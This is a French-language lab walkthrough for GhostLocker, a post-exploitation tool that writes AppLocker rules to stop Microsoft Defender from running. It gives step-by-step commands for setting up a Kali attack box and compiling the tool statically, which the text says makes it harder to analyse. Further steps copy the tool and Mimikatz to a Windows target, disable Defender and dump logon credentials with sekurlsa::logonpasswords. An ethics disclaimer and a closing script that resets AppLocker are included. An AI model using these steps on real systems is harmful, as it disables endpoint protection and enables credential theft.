# Lab – Contournement de Windows Defender via AppLocker (Living off the Land)

Contournement de Windows Defender via AppLocker (Living off the Land)

## 🧰 Technologies et outils

[![PowerShell](https://img.shields.io/badge/PowerShell-5391FE?style=flat&logo=powershell&logoColor=white)](https://docs.microsoft.com/powershell)
[![Windows](https://img.shields.io/badge/Windows-0078D6?style=flat&logo=windows&logoColor=white)](https://www.microsoft.com/windows)
[![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=flat&logo=kalilinux&logoColor=white)](https://www.kali.org)
[![Mimikatz](https://img.shields.io/badge/Mimikatz-EF0000?style=flat&logo=ghostery&logoColor=white)](https://github.com/gentilkiwi/mimikatz)
[![Azure](https://img.shields.io/badge/Azure-0078D4?style=flat&logo=microsoft-azure&logoColor=white)](https://azure.microsoft.com)
[![Bash](https://img.shields.io/badge/Bash-4EAA25?style=flat&logo=gnu-bash&logoColor=white)](https://www.gnu.org/software/bash/)
[![GitHub](https://img.shields.io/badge/GitHub-181717?style=flat&logo=github&logoColor=white)](https://github.com)
[![Ubuntu](https://img.shields.io/badge/Ubuntu-E9433F?style=flat&logo=ubuntu&logoColor=white)](https://ubuntu.com)

## 📦 Informations produit

- **Nom du lab** : GhostLocker – EDR-GhostLocker
- **Version** : 1.0
- **Type** : Bypass Microsoft Defender (AppLocker Abuse)
- **Usage** :
  - Blue Team
  - SOC
  - Analyse forensique
  - Détection AMSI / EDR

---

## 🏢 Organisation

- **Développé par** : _dspitech_
- **Localisation** : Paris, France
- **Date** : Janvier 2026

## 📌 Contexte général

GhostLocker (souvent associé au projet **EDR-GhostLocker**) est un outil de **post-exploitation** conçu pour neutraliser les solutions de sécurité Windows, notamment **Windows Defender**, en utilisant les **mécanismes de sécurité natifs de Windows contre eux-mêmes**.

Contrairement à un malware classique qui cherche à se cacher ou à se supprimer après exécution, GhostLocker agit comme un **administrateur système malveillant** qui applique volontairement des politiques de sécurité destructrices pour l’antivirus.

> 🔑 L’objectif n’est pas de supprimer Defender, mais de le **paralyser** sans générer d’alertes évidentes.

---

## 📖 Définitions clés

### 🧠 Post-Exploitation

Phase suivant la compromission initiale d’un système, durant laquelle l’attaquant :

- élève ses privilèges,
- neutralise les protections,
- maintient la persistance,
- exploite les accès (exfiltration, credentials, mouvement latéral).

### 🧩 Living off the Land (LotL)

Technique consistant à utiliser **des outils et fonctionnalités légitimes du système cible** (PowerShell, AppLocker, GPO, WMI…) pour mener une attaque, rendant la détection plus complexe.

### 🔐 AppLocker

Fonctionnalité de sécurité Windows permettant de **restreindre l’exécution de fichiers** (EXE, DLL, scripts, MSI, AppX) via des règles basées sur :

- chemins,
- éditeurs,
- signatures,
- hashes.

---

## 🧠 Le Concept : une attaque de type _Denial of Service_ locale

GhostLocker ne désinstalle pas Windows Defender — ce qui déclencherait immédiatement des alertes EDR.

À la place, il applique une **inversion de rôle** :

- 🛡️ **Normalement** : AppLocker bloque les malwares
- 🔄 **Avec GhostLocker** : AppLocker bloque **Microsoft Defender lui-même**

### ⚙️ Mécanisme de paralysie

1. Des règles AppLocker interdisent l’exécution des binaires Defender (ex: `MsMpEng.exe`)
2. Windows tente de lancer Defender au démarrage
3. AppLocker empêche son exécution
4. Defender reste installé mais **ne peut plus fonctionner**

➡️ Résultat : un antivirus **"mort-vivant"**  
Présent, actif en apparence, mais incapable de scanner quoi que ce soit.

---

## 🛠️ Fonctionnement technique (vue d’ensemble)

Le code source manipulé (`main_improved.cpp`) réalise généralement les actions suivantes :

### 1️⃣ Vérification des privilèges

- Vérifie que l’exécutable est lancé avec des **droits administrateur**
- Condition indispensable pour modifier les politiques de sécurité

### 2️⃣ Activation et manipulation d’AppLocker

- Modification de clés de registre liées aux **Group Policy Objects (GPO)**
- Activation du moteur AppLocker si nécessaire

### 3️⃣ Injection de règles AppLocker (XML)

- Génération d’une politique AppLocker au format XML
- Ciblage des exécutables Defender :
  - `MsMpEng.exe`
  - autres composants Microsoft Defender

### 4️⃣ Application forcée de la politique

- Chargement de la politique AppLocker
- Forçage de la mise à jour GPO
- Redémarrage de la machine

---

## 🛡️ Pourquoi GhostLocker est efficace en pentest ?

### 🔍 Signature faible

- Utilise uniquement des **APIs Windows légitimes**
- Peu ou pas de patterns détectables par signature

### ♻️ Persistance native

- Les règles AppLocker survivent aux redémarrages
- Aucun service tiers installé

### 🚫 Évasion totale

- Une fois Defender neutralisé :
  - Mimikatz
  - Netcat
  - outils post-exploitation bruyants  
    peuvent être utilisés sans détection immédiate

---

## ⚠️ Note éthique et légale

GhostLocker est un **outil pédagogique et offensif** destiné à :

- la formation en cybersécurité,
- les laboratoires (VM, Azure Lab, HackLab),
- les missions de **pentest autorisées**.

❌ Son utilisation sur des systèmes réels sans autorisation explicite est **illégale**.

---

## 📚 Sources et références

- Projet GitHub EDR-GhostLocker  
  https://github.com/zero2504/EDR-GhostLocker

- Documentation Microsoft – AppLocker  
  https://learn.microsoft.com/en-us/windows/security/threat-protection/applocker/applocker-overview

- MITRE ATT&CK – Living off the Land  
  https://attack.mitre.org/techniques/T1218/

- Documentation Microsoft – Windows Defender / Microsoft Defender Antivirus  
  https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/

---

Le TP repose sur le détournement d'une fonctionnalité de sécurité légitime de Windows (**AppLocker**) pour neutraliser une autre couche de sécurité (**Windows Defender**).  
Il s'agit d'une attaque de type **Living off the Land (LotL)**.

---

## Étape 1 : Installation du compilateur

Ce compilateur est utilisé pour convertir le script PowerShell en un exécutable Windows (`.exe`).  
Cela permet de masquer le code source du script et de contourner les restrictions d'exécution de PowerShell, notamment celles imposées par AppLocker.

### Téléchargement et installation du compilateur

```bash
# 1. Récupération de l'adresse IP locale et ajout d'une entrée dans le fichier hosts
echo "127.0.0.1 $(hostname)" | sudo tee -a /etc/hosts && \

# 2. Nettoyage des verrous APT (au cas où une installation a planté)
sudo rm -f /var/lib/dpkg/lock-frontend /var/lib/apt/lists/lock && \

# 3. Mise à jour et installation de l'arsenal complet
# Inclus : Compilateur, Headers Windows.h, Mimikatz et SSH
sudo apt update && sudo apt install -y \
    g++-mingw-w64-x86-64 \
    mingw-w64-common \
    mingw-w64-x86-64-dev \
    mimikatz \
    windows-binaries \
    openssh-server \
    git && \

# 4. Activation du SSH pour permettre le transfert vers Windows
sudo systemctl enable ssh --now && \

# 5. Rafraîchissement de l'environnement
source ~/.bashrc && echo -e "\n\n--- TOUT EST PRÊT : COMPILATEUR ET OUTILS INSTALLÉS ---"
```

## Étape 2 : Récupération du dépôt GitHub

```bash
git clone https://github.com/dspitech/Bypasss-Defender-EDR-GhostLocker.git
cd Bypasss-Defender-EDR-GhostLocker
```

## Étape 3 : Compilation du script PowerShell en exécutable Windows

Cette commande compile le fichier C++ `main_improved.cpp` en un exécutable Windows nommé `program.exe`.
L'option `-static` permet de lier statiquement les bibliothèques pour rendre l'exécutable autonome et plus difficile à analyser.

```bash
sudo x86_64-w64-mingw32-g++ main_improved.cpp -o program.exe -static

```

## Étape 4 : Préparation de la cible Windows 10

### Activation d’AppLocker

AppLocker ne fonctionne que si le service **Identité de l'application** est actif.

1. `Win + R` → `services.msc`
2. Rechercher **Identité de l'application** (_Application Identity_)
3. Clic droit → **Démarrer** ou **Redémarrer**

---

## Étape 5 : Transfert de l'exécutable vers la machine Windows

```powershell
cd $env:USERPROFILE\Desktop
scp kalidefender@10.0.1.5:/home/kalidefender/Bypass_Microsoft_Defender/program.exe .
```

- à Remplacer par vos vrais indenttifiants : `/home/kalidefender` - `10.0.1.5` - `kalidefender`

## Étape 6 : Récupération de Mimikatz

_(Il sera probablement supprimé par Defender à ce stade)_

### Vérifier le chemin de Mimikatz sur Kali

```bash
find /usr/share -name "mimikatz.exe" 2>/dev/null
```

### Transférer Mimikatz vers Windows

```powershell
scp kalidefender@10.0.1.5:/usr/share/windows-resources/mimikatz/x64/mimikatz.exe .

```

- A Remplacer par vos vrais indenttifiants : `kalidefender@10.0.1.5`

## Étape 7 : Exécution de l'exécutable pour neutraliser Windows Defender

L'exécutable `program.exe` contient le code nécessaire pour désactiver Windows Defender.

```powershell
.\program.exe
```

## Étape 8 : Vérification de la désactivation de Windows Defender

### Redémarrage de la machine

```powershell
Restart-Computer -Force
```

### Vérification de l'état de Defender

Après le redémarrage, vérifier que Windows Defender est désactivé (`Windows Security` -> Virus & threat protection -> Manage settings -> Real-time protection doit être désactivé).

> En ligne de commande

```powershell
Get-MpComputerStatus |
Select-Object AMRunningMode, AMServiceEnabled, AMServiceRunning,
              AntispywareEnabled, AntivirusEnabled, AntivirusRunning
```

### Vérification des règles AppLocker

Vérifier les règles AppLocker pour confirmer que le contournement a fonctionné (`Local Security Policy` -> `Application Control Policies` -> `AppLocker` -> `Executable Rules`).
Vous devriez voir que les règles AppLocker sont toujours en place, mais que Windows Defender est désactivé.

> En ligne de commande

```powershell
Get-AppLockerPolicy -Effective |
Select-Object -ExpandProperty RuleCollections
```

## Étape 9 : Retransfert & Réexécution de Mimikatz (post-contournement)

Il ne sera probablement plus détecté par Defender à ce stade

```powershelle
# Transfert
scp kalidefender@10.0.1.5:/usr/share/windows-resources/mimikatz/x64/mimikatz.exe .

# Exécution
.\mimikatz.exe

```

### Extraction des identifiants

```text
sekurlsa::logonpasswords
```

## Contournement de l’attaque et réactivation de Windows Defender

### Réinitialisation de la politique AppLocker

```powershell
# Création d'un fichier temporaire XML vide
$tempPath = [System.IO.Path]::GetTempFileName()

$emptyPolicy = @'
<AppLockerPolicy Version="1">
  <RuleCollection Type="Exe" EnforcementMode="NotConfigured" />
  <RuleCollection Type="Msi" EnforcementMode="NotConfigured" />
  <RuleCollection Type="Script" EnforcementMode="NotConfigured" />
  <RuleCollection Type="Dll" EnforcementMode="NotConfigured" />
  <RuleCollection Type="Appx" EnforcementMode="NotConfigured" />
</AppLockerPolicy>
'@

Set-Content -Path $tempPath -Value $emptyPolicy -Encoding UTF8

Write-Host '[*] Removing AppLocker policy (setting to NotConfigured)...'
Set-AppLockerPolicy -XmlPolicy $tempPath -ErrorAction Stop

Remove-Item $tempPath -Force

Write-Host '[*] Forcing Group Policy update...'
gpupdate /force | Out-Null

Write-Host '[+] AppLocker policy has been reset to "NotConfigured" (disabled).'
```
